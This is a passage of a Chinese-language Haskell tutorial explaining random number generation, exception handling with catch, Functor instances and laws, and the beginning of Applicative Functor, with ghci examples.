\u5176\u4e2d StdGen \u662f\u4e00\u4e2a RandomGen \u7684\u5b9e\u4f8b \u8fd0\u7528 random \u751f\u6210\u968f\u673a\u6570\u9700\u8981\u6307\u5b9a\u7c7b\u578b\uff0c\u4e0d\u7136\u7a0b\u5e8f\u65e0\u6cd5\u786e\u5b9a a \u662f\u4ec0\u4e48\u7c7b\u578b\u3002\u4f8b\u5982\uff1a ghci > random ( mkStdGen 100 ) :: ( Int , StdGen ) ( 9216477508314497915 , StdGen { unStdGen = SMGen 712633246999323047 2532601429470541125 }) ghci > random ( mkStdGen 100 ) :: ( Char , StdGen ) ( '\\ 537310 ' ,StdGen {unStdGen = SMGen 712633246999323047 2532601429470541125}) ghci > random ( mkStdGen 100 ) :: ( Bool , StdGen ) ( True , StdGen { unStdGen = SMGen 712633246999323047 2532601429470541125 }) \u518d\u6b21\u8fd0\u884c\u540c\u6837\u7684\u51fd\u6570\uff0c\u4f1a\u5f97\u5230\u540c\u6837\u7684\u7ed3\u679c\u3002\u6240\u4ee5\u5982\u679c\u9700\u8981\u751f\u6210\u5176\u4ed6\u7684\u968f\u673a\u6570\uff0c\u9700\u8981\u66f4\u6362\u751f\u6210\u5668\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e0a\u4e00\u6b21\u8c03\u7528\u7ed3\u679c\u8fd4\u56de\u7684\u65b0\u968f\u673a\u6570\u751f\u6210\u5668\uff1a threeCoins :: StdGen -> ( Bool , Bool , Bool ) threeCoins gen = let ( firstCoin , newGen ) = random gen ( secondCoin , newGen' ) = random newGen ( thirdCoin , newGen'' ) = random newGen' in ( firstCoin , secondCoin , thirdCoin ) randoms \u00b6 randoms :: (Random a, RandomGen g) => g -> [a] randoms \u63a5\u6536\u4e00\u4e2a RandomGen\uff0c\u8fd4\u56de\u4e00\u4e2a\u968f\u673a\u7684\u65e0\u7a77\u5217\u8868\u3002\u56e0\u4e3a\u5b83\u662f\u65e0\u7a77\u7684\uff0c\u6240\u4ee5\u4e0d\u4f1a\u8fd4\u56de\u65b0\u7684\u968f\u673a\u6570\u751f\u6210\u5668 randomR \u00b6 randomR :: (Random a, RandomGen g) => (a, a) -> g -> (a, g) \u53ef\u4ee5\u7528\u6765\u751f\u6210\u6709\u8303\u56f4\u7684\u968f\u673a\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5143\u7ec4\uff0c\u8868\u793a\u751f\u6210\u968f\u673a\u6570\u7684\u8303\u56f4(\u95ed\u533a\u95f4) randomRs \u00b6 randomRs :: (Random a, RandomGen g) => (a, a) -> g -> [a] \u540c\u4e0a\u4e24\u4e2a\uff0c\u751f\u6210\u6709\u8303\u56f4\u7684\u65e0\u7a77\u968f\u673a\u6570\u5217\u8868 getStdGen \u00b6 \u5982\u679c\u60f3\u8981\u8ba9\u7a0b\u5e8f\u6bcf\u6b21\u8fd0\u884c\u5f97\u5230\u4e0d\u540c\u7684\u968f\u673a\u7ed3\u679c\uff0c\u9700\u8981\u4f7f\u7528 getStdGen \u6765\u83b7\u53d6\u5168\u5c40\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u5b83\u4f1a\u5728\u6bcf\u6b21\u8fd0\u884c\u7684\u65f6\u5019\u4ea7\u751f\u4e0d\u540c\u7684\u503c\uff0c\u4e5f\u56e0\u6b64\uff0c\u5b83\u8fd4\u56de\u7684\u662f\u4e00\u4e2a I/O action\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u76f4\u63a5\u7684 StdGen getStdGen :: Control.Monad.IO.Class.MonadIO m => m StdGen \u5373\u53ef\u4ee5\u770b\u6210 getStdGen :: IO StdGen\uff0c\u9700\u8981\u4f7f\u7528 <- \u64cd\u4f5c\u7b26\u5c06 StdGen \u63d0\u53d6\u51fa\u6765 \u4f46\u662f\u5728\u540c\u4e00\u4e2a\u7a0b\u5e8f\u4e2d\uff0cgetStdGen \u7684\u7ed3\u679c\u662f\u76f8\u540c\u7684\uff0c\u5168\u5c40\u968f\u673a\u6570\u751f\u6210\u5668\u4e0d\u4f1a\u81ea\u52a8\u66f4\u65b0\uff0c\u6240\u4ee5\u5c31\u9700\u8981\u53e6\u4e00\u4e2a\u51fd\u6570 newStdGen newStdGen \u00b6 newStdGen :: Control.Monad.IO.Class.MonadIO m => m StdGen \u6267\u884c newStdGen \u4f1a\u8fdb\u884c\u4e24\u4e2a\u64cd\u4f5c\uff1a \u66f4\u65b0\u5168\u5c40\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u4e0b\u6b21\u6267\u884c getStdGen \u4f1a\u83b7\u5f97\u4e0d\u540c\u7684\u7ed3\u679c \u8fd4\u56de\u4e00\u4e2a I/O action\uff0c\u5305\u542b\u4e00\u4e2a\u65b0\u7684 StdGen\uff08\u4f46\u662f\u8fd9\u4e2a\u751f\u6210\u5668\u548c\u5168\u5c40\u751f\u6210\u5668\u4e5f\u4e0d\u540c\uff09 Exceptions \u00b6 \u7a0b\u5e8f\u5728\u8fd0\u884c\u5931\u8d25\u65f6\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u53ef\u4ee5\u901a\u8fc7 Control.Exception \u6a21\u5757\u4e2d\u7684 catch \u51fd\u6570\u6765\u6355\u83b7\u5f02\u5e38\uff1a catch :: Exception e => IO a -> (e -> IO a) -> IO a \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\uff0c\u4ee5 IO a \u4e3a\u8fd4\u56de\u503c\u7684\u7c7b\u578b\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u63a5\u6536\u5f02\u5e38\u5e76\u8fdb\u884c\u64cd\u4f5c\uff0c\u4f8b\u5982\uff1a import Control.Exception main = main' ` catch ` handler main' :: IO () main' = do ... handler :: Exception e => e -> IO () handler e = putStrLn \"...\" \u4e5f\u53ef\u4ee5\u5229\u7528\u5b88\u536b\uff08guard\uff09\u8bed\u6cd5\u548c System.IO.Error \u4e2d\u7684\u51fd\u6570\u6765\u5224\u65ad IO \u5f02\u5e38\u7684\u7c7b\u578b\u6765\u8fdb\u884c\u4e0d\u540c\u64cd\u4f5c\uff1a import System.Environment import System.IO.Error import Control.Exception main = toTry ` catch ` handler toTry :: IO () toTry = do ( fileName : _ ) <- getArgs contents <- readFile fileName putStrLn $ \"The file has \" ++ show ( length ( lines contents )) ++ \" lines!\" handler :: IOError -> IO () handler e | isDoesNotExistError e = putStrLn \"The file doesn't exist!\" | otherwise = ioError e \u5177\u4f53\u76f8\u5173\u5168\u90e8\u51fd\u6570\u89c1\u6587\u6863\uff1a System.IO.Error \u3001 Control.Exception Functors \u00b6 \u51fd\u5b50\uff08Functor\uff09\u662f\u4e00\u4e2a\u7c7b\u578b\u7c7b\uff08typeclass\uff09\uff0c\u548c\u5176\u4ed6\u7c7b\u578b\u7c7b\u4e00\u6837\uff0c\u5b83\u89c4\u5b9a\u4e86\u5176\u5b9e\u4f8b\u7c7b\u5fc5\u987b\u5b9e\u73b0\u7684\u529f\u80fd\uff08\u4f8b\u5982 Eq \u7c7b\u578b\u7c7b\u89c4\u5b9a\u4e86\u5b83\u7684\u5b9e\u4f8b\u5fc5\u987b\u662f\u53ef\u4ee5\u6bd4\u8f83\u662f\u5426\u76f8\u7b49\u7684\uff09\uff0cFunctor \u89c4\u5b9a\u7c7b\u5b83\u7684\u5b9e\u4f8b\u5fc5\u987b\u662f\u53ef\u4ee5\u8fdb\u884c\u6620\u5c04\u7684\u3002Functor \u8981\u6c42\u4f7f\u7528 fmap :: (a -> b) -> f a -> f b \u51fd\u6570\u6765\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a a -> b \u7c7b\u578b\u7684\u51fd\u6570\u3001\u4e00\u4e2a\u5185\u90e8\u5143\u7d20\u4e3a a \u7c7b\u578b\u7684\u51fd\u5b50\uff0c\u8fd4\u56de\u4e00\u4e2a\u5185\u90e8\u5143\u7d20\u4e3a b \u7c7b\u578b\u7684\u51fd\u5b50 Functor \u53ef\u4ee5\u6bd4\u4f5c\u76d2\u5b50\uff0c\u90a3 fmap \u51fd\u6570\u5c31\u76f8\u5f53\u4e8e\u7ed9\u5b9a\u4e00\u4e2a\u51fd\u6570\u548c\u4e00\u4e2a\u76d2\u5b50\uff0c\u5c06\u76d2\u5b50\u4e2d\u7684\u5168\u90e8\u5143\u7d20\u90fd\u5e94\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u518d\u8fd4\u56de\u5e94\u7528\u51fd\u6570\u540e\u7684\u76d2\u5b50 \u51fd\u5b50\u7684\u5b9e\u4f8b\u5fc5\u987b\u662f\u4e00\u4e2a Kind \u4e3a * -> * \u7684\u7c7b\u578b\u6784\u9020\u5668\uff0c\u56e0\u4e3a\u5b83\u8981\u6c42\u5176\u662f\u4e00\u4e2a\u76d2\u5b50\uff0c\u76d2\u5b50\u5728\u63a5\u6536\u5185\u5bb9\u540e\u624d\u4f1a\u6210\u4e3a\u4e00\u4e2a\u5177\u4f53\u7684\u7c7b\u578b\u3002fmap \u4e2d\u7684 f a \u548c f b \u4e5f\u662f\u56e0\u4e3a f \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5728\u63a5\u6536\u7c7b\u578b a/b \u540e\u624d\u4f1a\u53d8\u6210\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff08f a \u548c f b\uff09\u51fa\u73b0\u5728\u51fd\u6570\u7c7b\u578b\u58f0\u660e\u4e2d Functor \u7684\u5b9a\u4e49\u662f: class Functor f where fmap :: ( a -> b ) -> f a -> f b ( <$ ) :: a -> f a -> f b ( <$ ) = fmap . const \u53ef\u4ee5\u53d1\u73b0 Functor \u4e0d\u4ec5\u9700\u8981 fmap \u51fd\u6570\uff0c\u8fd8\u9700\u8981\u4e00\u4e2a <$ \u51fd\u6570\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a a \u7c7b\u578b\u7684\u53d8\u91cf\u548c\u4e00\u4e2a\u5185\u5bb9\u4e3a b \u7c7b\u578b\u7684\u51fd\u5b50\uff0c\u8fd4\u56de\u4e00\u4e2a\u5185\u5bb9\u4e3a a \u7c7b\u578b\u7684\u51fd\u5b50\uff1b\u4f5c\u7528\u5c31\u662f\u5c06\u4f20\u5165\u7684\u51fd\u5b50\u4e2d\u7684\u6240\u6709\u5143\u7d20\u90fd\u66ff\u6362\u4e3a\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u6bd4\u5982\uff1a ghci > 'a' <$ [ 1 , 2 , 3 ] \"aaa\" \u4f46\u5b83\u4e0d\u662f\u58f0\u660e\u4e00\u4e2a\u51fd\u5b50\u5b9e\u4f8b\u5fc5\u987b\u7684\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u4f7f\u7528 fmap \u548c const \u51fd\u6570\u590d\u5408\u6765\u5b9e\u73b0\uff0c\u5176\u4e2d const \u7684\u7c7b\u578b\u7b7e\u540d\uff1a const :: a -> b -> a \u5373\u63a5\u6536\u4e24\u4e2a\u53c2\u6570\uff0c\u4f46\u59cb\u7ec8\u53ea\u8fd4\u56de\u7b2c\u4e00\u4e2a\u53c2\u6570 Functor \u5b9e\u4f8b \u00b6 [] \u00b6 \u5217\u8868 [] \u662f\u4e00\u4e2a\u51fd\u5b50\uff0c\u5b83\u901a\u8fc7 map \u51fd\u6570\u6765\u5b9e\u73b0 fmap \u7684\u529f\u80fd\uff1a instance Functor [] where fmap = map map :: (a -> b) -> [a] -> [b] map \u548c fmap \u8981\u6c42\u7684\u76f8\u540c\uff0c\u8fbe\u6210\u7684\u76ee\u7684\u4e5f\u4e00\u81f4\u3002map \u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u548c\u4e00\u4e2a\u5217\u8868\uff0c\u5b83\u4f1a\u5c06\u5217\u8868\u4e2d\u7684\u6240\u6709\u5143\u7d20\u90fd\u5e94\u7528\u8fd9\u4e2a\u51fd\u6570\u540e\u518d\u8fd4\u56de\u8fd9\u4e2a\u5217\u8868 Maybe \u00b6 Maybe \u4e5f\u5177\u6709 kind * -> *\uff0c\u5b83\u4e5f\u662f\u4e00\u4e2a\u51fd\u5b50\uff1a instance Functor Maybe where fmap f Nothing = Nothing fmap f ( Just x ) = Just ( f x ) ghci > fmap ( * 2 ) Nothing Nothing ghci > fmap ( * 2 ) ( Just 2 ) Just 4 Either a \u00b6 Either \u7684 kind \u662f* -> * -> *\uff0c\u663e\u7136\u5b83\u4e0d\u662f\u51fd\u5b50\uff0c\u4f46\u662f\u56fa\u5b9a\u4e86\u4e00\u4e2a\u4f20\u5165\u7c7b\u578b\u7684 Either a \u7684 kind \u662f* -> *\uff0c\u4e5f\u662f\u4e00\u4e2a\u51fd\u5b50\uff1a instance Functor ( Either a ) where fmap f ( Left x ) = Left x fmap f ( Right x ) = Right ( f x ) ghci > fmap ( * 2 ) ( Left 4 ) Left 4 ghci > fmap ( * 2 ) ( Right 4 ) Right 8 \u56e0\u4e3a\u4f7f\u7528 Either \u65f6\u4e00\u822c\u7528\u53f3\u503c\u8868\u793a\u6b63\u5e38\u7ed3\u679c\uff0c\u5de6\u503c\u8868\u793a\u5f02\u5e38\u4fe1\u606f\uff0c\u6240\u4ee5\u4f7f\u7528 fmap \u65f6\u53ea\u5bf9\u53f3\u503c\u8fdb\u884c\u64cd\u4f5c\uff0c\u5982\u679c\u65f6\u5de6\u503c\u5219\u4fdd\u6301\u4e0d\u53d8\uff08\u800c\u4e14\u5de6\u503c\u6b64\u65f6\u4e5f\u4f5c\u4e3a\u786e\u5b9a\u7c7b\u578b\u786e\u5b9a\u503c\u5b58\u5728\uff09 IO \u00b6 IO \u4e5f\u662f\u4e00\u4e2a\u51fd\u5b50\uff0c\u4f7f\u7528 fmap \u5bf9 IO \u4e2d\u5185\u5bb9\u5e94\u7528\u51fd\u6570\uff1a instance Functor IO where fmap f action = do result <- action return ( f result ) ghci > fmap ( \"input: \" ++ ) getLine test \"input: test\" (,) a \u00b6 (,) \u8868\u793a\u4e00\u4e2a\u4e8c\u5143\u7ec4\u7684\u7c7b\u578b\u6784\u9020\u5668\uff0c(,) :: * -> * -> *\uff0c\u800c\u786e\u5b9a\u4e86\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u7c7b\u578b\u540e\u5c31\u53d8\u6210\u4e86 (,) a\uff0c\u5b83\u7684 kind \u662f * -> *\u3002\u4e5f\u662f\u4e00\u4e2a\u51fd\u5b50\uff0c\u8fdb\u884c fmap \u51fd\u6570\u65f6\u53ea\u5bf9\u7b2c\u4e8c\u4e2a\u5143\u7d20\u5e94\u7528\uff1a instance Functor ((,) a ) where fmap f ( x , y ) = ( x , f y ) \u53ea\u5269\u4e00\u4e2a\u5143\u7d20\u7684\u4e09\u5143\u7ec4\u548c\u56db\u5143\u7ec4\u4e5f\u90fd\u662f\u51fd\u5b50\uff0cfmap \u4e5f\u53ea\u5bf9\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5e94\u7528\uff1a instance Functor ((,,) a b ) where fmap f ( a , b , c ) = ( a , b , f c ) instance Functor ((,,,) a b c ) where fmap f ( a , b , c , d ) = ( a , b , c , f d ) (->) r \u00b6 -> \u4e5f\u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5b83\u7684 kind\uff1a (->) :: * -> * -> * \u4e00\u4e2a\u6620\u5c04\uff08\u4e00\u5143\u51fd\u6570\uff09\u7684\u7c7b\u578b a -> b \u4e5f\u53ef\u4ee5\u5199\u6210 (->) a b\uff0c\u5b83\u662f\u7531\u7c7b\u578b a \u548c\u7c7b\u578b b \u8f93\u5165\u5230\u7c7b\u578b\u6784\u9020\u5668 -> \u4e2d\u540e\u5f62\u6210\u7684\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\u3002\u6240\u4ee5\u786e\u5b9a\u4e86\u8f93\u5165\u7c7b\u578b\u540e\u7684\u4e00\u5143\u51fd\u6570\u7684\u7c7b\u578b\u5c31\u662f (->) r\uff08\u5176\u4e2d r \u662f\u8f93\u5165\u7684\u7c7b\u578b\uff09 \u89c4\u5b9a\u7684 fmap \u7684\u7c7b\u578b\u7b7e\u540d\u662f\uff1a fmap :: (a -> b) -> f a -> f b \u5176\u4e2d\u7684 f \u662f\u51fd\u5b50\uff0c\u800c\u5728\u8fd9\u4e2a\u5b9e\u4f8b\u4e2d (->) r \u5c31\u662f\u51fd\u5b50\uff0c\u5c06\u5176\u5e26\u5165 f \u53ef\u4ee5\u5f97\u5230\uff1a fmap :: (a -> b) -> ((-> r) a) -> ((-> r) b) \u628a\u5176\u4e2d\u7684 (->) \u6362\u6210\u4e2d\u7f00\u53ef\u4ee5\u5f97\u5230\uff1a fmap :: (a -> b) -> (r -> a) -> (r -> b) \u4f20\u5165\u4e24\u4e2a\u51fd\u6570\uff0c\u4e00\u4e2a\u7c7b\u578b\u4e3a a -> b\uff0c\u4e00\u4e2a\u7c7b\u578b\u4e3a r -> a\uff0c\u8fd4\u56de\u4e00\u4e2a\u51fd\u6570\uff0c\u7c7b\u578b\u4e3a r -> b\u3002 \u4e0d\u96be\u63a8\u6d4b\u8fd9\u4e2a fmap \u662f\u5c06\u8fd9\u4e24\u4e2a\u51fd\u6570\u590d\u5408\u4e86\uff0c\u5148\u5bf9\u8f93\u5165\u5bf9 r \u5e94\u7528\u7b2c\u4e8c\u4e2a\u51fd\u6570\u4ea7\u751f\u7c7b\u578b a \u7684\u7ed3\u679c\uff0c\u7136\u540e\u5728\u5e94\u7528\u7b2c\u4e00\u4e2a\u51fd\u6570\u4ea7\u751f\u7c7b\u578b b \u7684\u7ed3\u679c\uff0c\u6240\u4ee5 (->) r \u5b9a\u4e49\u7684 fmap \u662f\uff1a instance Functor (( -> ) r ) where fmap f g = ( \\ x -> f ( g x )) \u6240\u4ee5 (->) r \u7684 fmap \u5176\u5b9e\u5c31\u662f\u51fd\u6570\u590d\u5408 (.)\uff1a instance Functor (( -> ) r ) where fmap = ( . ) ghci > : t fmap ( * 3 ) ( + 100 ) fmap ( * 3 ) ( + 100 ) :: ( Num a ) => a -> a ghci > fmap ( * 3 ) ( + 100 ) 1 303 ghci > ( * 3 ) ` fmap ` ( + 100 ) $ 1 303 ghci > ( * 3 ) . ( + 100 ) $ 1 303 Functor Laws \u00b6 \u6240\u6709\u7684\u51fd\u5b50\u90fd\u5e94\u8be5\u6ee1\u8db3\u4e24\u4e2a\u5b9a\u5f8b\u3002\u8fd9\u4e24\u4e2a\u5b9a\u5f8b\u4e0d\u662f Haskell \u5f3a\u5236\u8981\u6c42\u7684\uff0c\u4f46\u5e94\u8be5\u786e\u4fdd\u4e00\u4e2a\u51fd\u5b50\u6ee1\u8db3\u8fd9\u4e24\u4e2a\u5b9a\u5f8b\uff1a fmap id = id \uff08\u5176\u4e2d id \u4e3a\u51fd\u6570 (\\x -> x) \uff09\uff1a\u5373\u5bf9\u4e00\u4e2a\u51fd\u5b50 fmap id\uff0c\u90a3\u5b83\u5e94\u8be5\u8fd4\u56de\u672c\u8eab\uff08fmap id a = id a = a\uff0ca \u4e3a\u4e00\u4e2a\u51fd\u5b50\uff09\uff0c\u6bd4\u5982\uff1a ghci > fmap id [ 1 , 2 , 3 ] [ 1 , 2 , 3 ] ghci > fmap id ( Just 2 ) Just 2 fmap (f . g) = fmap f . fmap g \uff1a\u5373\u51fd\u5b50\u7684 fmap \u652f\u6301\u7ed3\u5408\u5f8b fmap (f . g) a = fmap f . fmap g $ a = fmap f (fmap g a)\uff0c\u5176\u4e2d a \u4e3a\u4e00\u4e2a\u51fd\u5b50 fmap (f . g) (Just x) = fmap f (fmap g (Just x)) = fmap f (Just (g x)) = Just (f (g x)) ghci > fmap (( * 3 ) . ( + 100 )) ( Just 1 ) Just 303 \u6ee1\u8db3\u7b2c\u4e00\u4e2a\u5b9a\u5f8b\u7684\u51fd\u5b50\u4e00\u5b9a\u6ee1\u8db3\u7b2c\u4e8c\u4e2a\u5b9a\u5f8b\uff0c\u6240\u4ee5\u53ea\u8981\u68c0\u67e5\u51fd\u5b50\u662f\u5426\u6ee1\u8db3\u7b2c\u4e00\u4e2a\u5b9a\u5f8b\u5373\u53ef Intuition \u00b6 \u5bf9\u4e8e\u51fd\u5b50\u548c fmap\uff0c\u6709\u4e24\u79cd\u7406\u89e3\u65b9\u6cd5 \u51fd\u5b50\u662f\u4e00\u79cd\u5bb9\u5668\uff08container\uff09\uff1bfmap \u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u548c\u4e00\u4e2a\u5bb9\u5668\uff0c\u5728\u5bb9\u5668\u5185\u90e8\u5e94\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u8fd4\u56de\u5e94\u7528\u540e\u7684\u65b0\u5bb9\u5668 \u51fd\u5b50\u662f\u4e00\u79cd\u8ba1\u7b97\u4e0a\u4e0b\u6587\uff08context\uff09\uff1bfmap \u662f\u67ef\u91cc\u5316\u7684\uff0c\u628a\u5176\u7c7b\u578b\u7b7e\u540d\u770b\u4f5c fmap :: (a -> b) -> (f a -> f b) \u2003\u2003\u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u8fd4\u56de\u53e6\u4e00\u4e2a\u51fd\u6570\uff0c\u4f20\u5165\u51fd\u6570 g :: a -> b\uff0cfmap \u5c06\u5176\u8f6c\u6362\u4e3a\u65b0\u7684\u51fd\u6570 fmap g :: f a -> f b \u2003\u2003\u4f7f\u666e\u901a\u7684\u51fd\u6570 g \u53ef\u4ee5\u5728\u8ba1\u7b97\u4e0a\u4e0b\u6587 f \u4e2d\u4f7f\u7528\uff0c\u8fd9\u79cd\u8f6c\u6362\u4e5f\u88ab\u79f0\u4e3a\u63d0\u5347\uff08lift\uff09 \u5e38\u7528\u51fd\u6570 \u00b6 <$> \u00b6 <$> \u51fd\u6570\u662f fmap \u7684\u4e2d\u7f00\u5f62\u5f0f\uff08\u5b83\u770b\u7740\u7c7b\u4f3c $ \uff0c f $ 3 \u5c06 f \u5e94\u7528\u5728\u5355\u4e2a\u503c 3 \u4e0a\uff0c\u800c f <$> [1, 2, 3] \u5c06 f \u5e94\u7528\u5728\u4e00\u4e2a\u51fd\u5b50\u4e0a\uff0c\u4e5f\u5c31\u662f\u5e94\u7528\u5728\u4e00\u4e2a\u51fd\u5b50\u5185\u90e8\u7684\u6240\u6709\u503c\u4e0a\uff09\uff1a ghci > fmap ( * 2 ) ( Just 2 ) 4 ghci > ( * 2 ) <$> Just 2 4 $> \u00b6 $> \u51fd\u6570\u5305\u542b\u5728 Data.Functor \u6a21\u5757\u4e2d ($>) :: Functor f => f a -> b -> f b Functor \u5b9a\u4e49\u65f6\u8981\u6c42\u4e86 <$ \u51fd\u6570\uff0c\u5c06\u51fd\u5b50\u5185\u90e8\u7684\u5143\u7d20\u5168\u90e8\u66ff\u6362\u4e3a\u6307\u5b9a\u7684\u67d0\u4e2a\u503c\uff0c\u800c $> \u6b63\u597d\u5c06 <$ \u51fd\u6570\u7684\u4e24\u4e2a\u53c2\u6570\u53cd\u4e86\u8fc7\u6765\uff0c\u76f8\u5f53\u4e8e flip (<$) \uff1a ghci > 'a' <$ [ 1 , 2 , 3 ] \"aaa\" ghci > [ 1 , 2 , 3 ] $> 'a' \"aaa\" void \u00b6 void \u51fd\u6570\u4e5f\u5305\u542b\u5728 Data.Functor \u6a21\u5757\u4e2d void :: Functor f => f a -> f () void \u51fd\u6570\u628a\u4e00\u4e2a\u51fd\u5b50\u5185\u90e8\u7684\u5168\u90e8\u5143\u7d20\u90fd\u53d8\u6210\u7a7a\uff08 () \uff09\uff0c void x \u76f8\u5f53\u4e8e () <$ x \uff1a ghci > void [ 1 , 2 , 3 ] [ () , () , () ] ghci > void ( Just 2 ) Just () Applicative Functor \u00b6 \u5e94\u7528\u51fd\u5b50\uff08Applicative Functor\uff09\u662f\u51fd\u5b50\u7684\u5347\u7ea7\u7248\uff0c\u5b83\u5305\u542b\u5728 Control.Applicative \u6a21\u5757\u4e2d\u3002 fmap \u8fdb\u884c\u7684\u64cd\u4f5c\u662f\u5c06\u4e00\u4e2a\u666e\u901a\u4e00\u5143\u51fd\u6570\u5e94\u7528\u5728\u4e00\u4e2a\u51fd\u5b50\u5185\u90e8\u3002\u800c\u5982\u679c\u8981\u5c06\u4e00\u4e2a\u5305\u542b\u51fd\u6570\u7684\u51fd\u5b50\u5e94\u7528\u5728\u53e6\u4e00\u4e2a\u51fd\u5b50\u4e0a\uff0cfmap \u5c31\u5904\u7406\u4e0d\u4e86\u4e86\uff0c\u4f46\u662f\u5e94\u7528\u51fd\u5b50\u7684\u65b9\u6cd5\u53ef\u4ee5\u5904\u7406\u3002\u5e94\u7528\u51fd\u5b50\u7684\u5b9a\u4e49\uff1a class Functor f => Applicative f where pure :: a -> f a ( <*> ) :: f ( a -> b ) -> f a -> f b \u5e94\u7528\u51fd\u5b50\u8981\u6c42\u5b9e\u73b0\u4e24\u4e2a\u51fd\u6570\uff1a pure :: a -> f a\uff0c\u4e0d\u96be\u7406\u89e3\uff0cpure \u63a5\u6536\u4e00\u4e2a\u503c\uff0c\u5e76\u5c06\u5176\u653e\u5728\u9ed8\u8ba4\u7684\u4e0a\u4e0b\u6587/\u5bb9\u5668\u4e2d\u3002\u5bf9\u4e8e\u5217\u8868\uff0cpure = []\uff1b\u5bf9\u4e8e Maybe\uff0cpure = Just <*> :: f (a -> b) -> f a -> f b\uff0c\u7c7b\u4f3c\u4e8e fmap :: (a -> b) -> f a -> f b\uff0c\u4f46\u4e0d\u540c\u7684\u662f <*> \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u7c7b\u578b\u662f f (a -> b) \u4e0d\u662f a -> b\u3002\u6240\u4ee5 <*> \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u51fd\u6570\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u666e\u901a\u51fd\u6570\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c<*> \u63a5\u6536\u4e00\u4e2a\u88c5\u6709\u51fd\u6570\u7684\u51fd\u5b50\u548c\u53e6\u4e00\u4e2a\u51fd\u5b50\uff0c\u5e94\u7528\u51fd\u6570\u540e\u8fd4\u56de\u65b0\u7684\u51fd\u5b50\u3002 Applicative Functor \u5b9e\u4f8b \u00b6 Maybe \u00b6 Maybe \u662f\u4e00\u4e2a\u5e94\u7528\u51fd\u5b50\uff1a instance Applicative Maybe where pure = Just Nothing <*> _ = Nothing ( Just f ) <*> something = fmap f something pure \u51fd\u6570\uff1a\u5c06\u4e00\u4e2a\u503c\u653e\u5728\u9ed8\u8ba4\u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u800c\u5bf9\u4e8e Maybe\uff0c\u9ed8\u8ba4\u7684\u4e0a\u4e0b\u6587\u5c31\u662f Just\uff0c\u6240\u4ee5 pure x = Just x <*> \u51fd\u6570\uff1a\u5c06\u88c5\u6709\u51fd\u6570\u7684\u51fd\u5b50\u4e2d\u7684\u51fd\u6570\u5e94\u7528\u53e6\u4e00\u4e2a\u51fd\u5b50\u4e2d \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f Nothing\uff0c\u5373\u7b2c\u4e00\u4e2a\u51fd\u5b50\u4e0d\u5305\u542b\u51fd\u6570\uff0c\u90a3\u8fd4\u56de\u7684\u7ed3\u679c\u5c31\u4e5f\u4f1a\u662f Nothing \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u88c5\u6709\u51fd\u6570f\u7684\u51fd\u5b50 Just f\uff0c\u5c06\u5176\u4e2d\u7684\u51fd\u6570f\u5e94\u7528\u5728\u51fd\u5b50 something \u4e2d\uff0c\u53ea\u9700\u8981\u5c06 f \u63d0\u53d6\u51fa\u6765\u4f7f\u7528 fmap \u5e94\u7528\u5728\u51fd\u5b50 something \u4e2d\u5373\u53ef \u5b9e\u9645\u5e94\u7528\u7684\u4f8b\u5b50\uff1a ghci > Just ( + 3 ) <*> Just 9 Just 12 ghci > pure ( + 3 ) <*> Just 9 Just 12 ghci > ( + 3 ) <$> Just 9 Just 12 ghci > Nothing <*> Just 9 Nothing \u7b2c\u4e00\u4e2a\u4f8b\u5b50\uff0cJust (+3) \u662f\u4e00\u4e2a\u5305\u542b\u51fd\u6570 (+3) \u7684\u51fd\u5b50\uff0c\u5c06\u5176\u5e94\u7528\u5728\u51fd\u5b50 Just 9 \u4e2d\uff0c\u5c06 Just (+3) \u4e2d\u7684\u51fd\u6570 (+3) \u63d0\u53d6\u51fa\u6765\uff0c\u5e94\u7528\u5728 Just 9 \u4e2d\uff0c\u5f97\u5230\u4e86 Just 12 \u7b2c\u4e8c\u4e2a\u4f8b\u5b50\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u5728\u8fd9\u91cc pure (+3) \u548c Just (+3) \u7b49\u6548\uff0c\u56e0\u4e3a pure \u5c06\u51fd\u6570 (+3) \u653e\u5728\u9ed8\u8ba4\u4e0a\u4e0b\u6587\u4e2d\uff0c\u4e5f\u5c31\u662f Just \u4e2d\u4e86 \u800c <*> \u80fd\u505a\u7684\u4e0d\u6b62\u8fd9\u4e9b\uff0c\u4ed6\u53ef\u4ee5\u8fde\u7eed\u4f20\u5165\u66f4\u591a\u51fd\u5b50\u4f5c\u4e3a\u53c2\u6570\uff0c\u6bd4\u5982\uff1a ghci > pure ( + ) <*> Just 3 <*> Just 9 Just 12 ghci > pure ( \\ x y z -> x + y + z ) <*> Just 3 <*> Just 4 <*> Just 5 Just 12 <*> 